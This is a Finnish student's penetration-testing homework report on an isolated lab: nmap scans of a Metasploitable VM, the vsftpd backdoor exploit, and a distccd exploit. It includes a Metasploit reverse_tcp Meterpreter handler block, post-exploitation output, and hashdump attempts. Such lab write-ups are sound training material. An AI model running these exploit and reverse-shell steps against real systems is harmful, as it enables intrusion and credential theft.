# Social sploit

## Johdanto

Kotitehtävässä h2 tuli jatkaa kokeiluja porttiskannaamisesta (kotitehtävä h1) ja kokeilla muutamia hyökkäyskeinoja Metasploitablen avulla (aloitin tämän jo 1.11 oppitunnilla).

Asensin Metasploitablen ja Kalin sekä HostOnly-ethernetverkon jo aikaisempaa kotitehtävää varten, joten siirryin suoraan tehtävän pariin.

## Tiivistys (kohta X)

Kohdassa X luin "Conducting a penetration test with Metasploit" osuuden Jaswalin kirjasta ja tein seuraavat muistiinpanot;

-Murtotestaamisen avulla voidaan testata järjestelmän haavoittuvaisuuksia, vastatoimia ja mahdollisia reikiä puolustuksessa.

-Metasploitablessa voidaan lähettää erilaisia hyökkäyspaketteja turvallisessa ja vakaassa ympäristössä.

-Kompromisoidussa järjestelmässä voidaan käyttää Meterpreter-ohjelmaa, joka tarjoaa vakaammaan ja monipuolisemman alustan kompromisoidun kohteen tutkimiseen.

### Lähteet

Jaswal 2020: Conducting a penetration test with Metasploit. Luettavissa: https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31. Luettu: 6.11.2024

## Porttiskannaus (kohdat A-F)

Varmistin ensin tuttuun tapaan, että laitteet ovat irti Internetistä ja että ne saavat yhteyden toisiinsa `ping` komennolla. Molemmat virtuaalikoneet ovat HostOnly-verkossa, jonka lisäksi Kali-virtuaalikoneella on NAT-verkkokortti, joka on irroitettu.

![image](https://github.com/user-attachments/assets/f2a45fd1-2004-48b1-bf73-ef999d3e6b4a)

![image](https://github.com/user-attachments/assets/c3f97317-d817-4b9f-9fa9-b309df1677e5)

_Totesin testein, että koneet ovat irti Internetistä, mutta saavat HostOnly-verkossa toisiinsa yhteyden._

Seuraavaksi etsin Metasploitablen porttiskannaamalla ja tarkistin olevani oikeassa IP-osoitteessa selaimen avulla. Tätä varten avaan ensin Metasploitablen konsolin komennolla `msfconsole` ja tämän jälkeen suoritan aliverkon porttiskannauksen komennolla `db_nmap -sn 192.168.82.0/24`

![image](https://github.com/user-attachments/assets/49d9b573-0d62-43cd-8d61-04c1686fd9a2)

_Aliverkon porttiskannaus_

Aliverkko `192.168.82.0/24` skannattiin ja lopputuloksena 256 IP-osoitteesta vain kaksi oli käytössä, eli Kali osoitteessa `192.168.82.4` ja toinen kone osoitteessa `192.168.82.3`. Nopea Firefox-haku totesi jälkimmäisen osoitteen omaksi Metasploitable-virtuaalikoneeksi.

![image](https://github.com/user-attachments/assets/b5e4c63e-c30a-451a-b11d-1ea532a33242)

_Metasploitablen IP-osoite hakukoneessa._

Seuraavaksi skannasin Metasploitablen perusteellisesti ja tallensin tiedot tarkasteltavaksi. Tämä järjestyy komennolla `db_nmap -A -p- 192.168.82.3` josta `db_` osio tallentaa tulosteen Metasploitablen tietokantoihin ja `-A -p-` spesifoi haun olevan kattava ja koskevan kaikkia portteja. Tämän jälkeen voin käyttää milloin vaan komentoja `hosts` ja `services` skannauksen tuloksien tarkastelua varten. Voin myös suodattaa näistä tuloksista tietoja. Metasploitable ei tunnu tykkäävän merkistä `|`, joten käytin komentoa `services -S apache` suodattaakseni vain apacheen liittyvät tulokset.

![image](https://github.com/user-attachments/assets/80d91c19-1abd-409f-8a49-63f64ae7d25c)

_Porttiskannauksen tulosten tarkastelu jälkeenpäin_

![image](https://github.com/user-attachments/assets/eafd7ac0-f5cf-4545-95e4-d936b4718780)

_Porttiskannauksen tulosten suodattaminen_

Käytin tämän keinon lisäksi myös komentoa `nmap -A -p- -oA scan_result 192.168.82.3`, joka tallentaa samat tiedot kolmeen eri tiedostoon; `scan_result.nmap`, `scan_result.xml` ja `scan_result.gnmap`. Näistä `.nmap` on nmap tuloste skannauksesta, `.xml` sama tuloste `XML` muodossa ja `.gnmap` on helposti `grep`-komennolla haettava tiedosto.

Näistä skannaustulosteista `db_nmap` on hyvä ja nopea saada Metasploitablen konsoliin tarvittavat tiedot jatkotoimia varten. `nmap -oA` sen sijaan antoi monimuotoisemman tulosteen, jota voi olla helpompi hyödyntää esim. työkaluissa ja skriptaamisessa. Käytin itse mielummin `db_nmap`-tulostetta sen käyttöhelppouden vuoksi kunnes tarvitsin tarkempaa tietoa tai tietoa helpommasti tulkittavassa muodossa.

### Lähteet

## Tunkeutuminen (kohdat G-N)

Seuraavaksi kokeilin murtautua Metasploitableen käyttäen takaovea portissa 21 (`vsftpd`). Pystyin tarkistamaan tämän heikkouden olemassaolon aikaisemmin käytetyllä `services -S`-komennolla. Tämän jälkeen valitsin hyökkyksen sekä maalin ja käskin aloittaa hyökkäyksen `exploit`-komennolla.

![image](https://github.com/user-attachments/assets/95bbeb08-bafa-47ed-b5de-82e796431f30)

_Onnistunut vsftpd hyökkäys_

Onnistuneen hyökkäyksen jälkeen aloin valmistelemaan Meterpreteriä, jotta voisin kerätä levittämiseen tarvittavaa tietoa tehokkaasti. Aluksi asetin `vsftpd`-yhteyden taustalle komennolla `background` ja suoritin Meterpreter-yhteyden luomisen seuraavalla komentosarjalla;

```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.82.4
set LPORT 4443
exploit -j
```

Tämä komentopätkä kertoi Meterpreterille tärkeät tiedot kohteesta sekä omasta koneestani. Tämän jälkeen voin päivättää nykyisen yhteyden `sessions 1` komennolla `sessions -u 1` ja täten saada Meterpreter toimimaan `vsftpd`-shellissä komennolla `sessions -i 2`

![image](https://github.com/user-attachments/assets/19638edd-d664-4ea4-9c94-377d808ce815)

_Meterpreter käyttöön_

Nyt kun sain Meterpreterin käyttöön, oli helppoa kerätä tärkeää tietoa koneesta jatkotoimien kannalta. Levittäytymiseen tähtäävä toimija saattaa olla kiinnostunut esimerkiksi kolmesta seuraavasta tiedoista;

```
meterpreter > sysinfo
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > ipconfig
```

Komento `sysinfo` kertoi koneen melko traagisesta tietoturvatilasta jossa käyttöjärjestelmä, kerneli ja arkkitehtuuri ovat vanhentuneita tai vanhaa teknologiaa. Tämä tarjoaa runsaasti jatkohyökkäysmahdollisuuksia.

```
meterpreter > ipconfig
Interface  2
============
Name         : eth0
Hardware MAC : 08:00:27:29:72:cb
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.82.3
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::a00:27ff:fe29:72cb
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

Komento `ipconfig` kertoi lisää koneen verkosta. Sain tätä kautta tietoon aliverkkomaskin `255.255.255.0` jota voi hyödyntää verkon skannaamisessa. Voimme myös olettaa laitteen olevan virtuaalikone sillä MAC-osoite `08:00:27` yhdistetään yleensä VirtualBoxiin.

Lopuksi ajoin komennon `ps`, joka kertoi koneen prosesseista. Huomattavia olivat esimerkiksi `4194 mysqld` josta voisi kaivaa kriittistä dataa, `distccd`, jonka tunnettu heikkous sallii koodin ajamisen etänä sekä `4054 named` eli BIND DNS-palvelin, jotka ovat tunnetusti alttiita hyökkäyksille. Näiden lisäksi prosesseissa on lukuisia muita heikkouksia joiden avulla voisi levittäytyä järjestelmään.

Aikaisemman osion `distccd` on toinen kiinnostava tapa päästä käsiksi koneeseen. Tein ensin hyökkäyksen ja exploittasin sen, kuten aikaisemminkin. Tällä kertaa alkuperäinen payload ei toiminut, joten hain computersecuritystudent oppitunnin verkkosivuilta toisen vaihtoehdon, joka toimi.

![image](https://github.com/user-attachments/assets/88b23cf1-a4db-4c59-b8dc-7350d3b3c03e)

Tämän jälkeen seurasin tuttua Meterpreter-yhteyden muodostamisprosessia, käyttäen aiempi konfigurointeja. Pääsin helposti sisään ja sysinfosta voin päätellä, että ollaan aiemmasta murtautumisesta tutulla paikalla.

![image](https://github.com/user-attachments/assets/d2282d0a-7142-4ddf-aaa3-565fc73fa9bc)

Kokeilin vielä joitain Meterpreterin komentoja kuten `getsystem` ja `hashdump`. Nämä vaativat `priv`-laajennusta toimiakseen, jota en ollut ladannut etukäteen. Muuten pystyin toimia melko vapaasti Metasploitablen shellissä Meterpreterin avulla.

Tallensin lopuksi login tekstitiedostoon `log001.txt` komennolla  `script -fa log001.txt`. Tämä täytyi tehdä ennen msfconsoleen astumista, sillä siellä ei voi suorittaa kaikkia komentoja. `cat` komennolla sain täyden listan tehdyistä komennoista session lopuksi.

### Lähteet

https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/

https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html

https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/

https://www.offsec.com/metasploit-unleashed/meterpreter-basics/

## Yleiset lähteet

Pohjana Tero Karvinen 2024: Tunkeutumistestaus -kurssi. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/.

Metaspoitable exploitability guide. Luettavissa: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/. Luettu 6.11.2024

Tätä dokumenttia saa kopioida ja muokata GNU General Public License (versio 2 tai uudempi) mukaisesti. http://www.gnu.org/licenses/gpl.html

